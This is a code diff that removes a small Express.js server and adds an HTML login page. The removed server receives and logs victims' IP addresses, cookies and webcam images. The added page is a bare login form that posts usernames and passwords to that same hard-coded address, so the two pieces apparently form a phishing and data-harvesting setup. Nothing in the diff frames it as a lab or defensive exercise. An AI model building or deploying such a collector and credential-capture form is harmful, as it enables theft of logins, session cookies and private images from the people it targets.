@@ -1,23 +1,21 @@
-const express = require("express");
-const multer = require("multer");
-const upload = multer();
-
-const app = express();
-
-app.use(express.json());
-
-app.post("/", upload.single("webcam_image"), (req, res) => {
-  const { ip, cookies } = req.body;
-  console.log("Received IP:", ip);
-  console.log("Received Cookies:", cookies);
-
-  if (req.file) {
-    console.log("Webcam image received:", req.file.originalname);
-  }
-
-  res.send("Data received successfully!");
-});
-
-app.listen(3000, () => {
-  console.log("Server running on http://10.0.1.33:3000");
-});
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login Form</title>
+</head>
+<body>
+    <h1>Login</h1>
+    <!-- HTML form to send credentials -->
+    <form action="http://10.0.1.33:3000" method="POST">
+        <label for="username">Username:</label>
+        <input type="text" id="username" name="username" required>
+        <br>
+        <label for="password">Password:</label>
+        <input type="password" id="password" name="password" required>
+        <br>
+        <button type="submit">Submit</button>
+    </form>
+</body>
+</html>
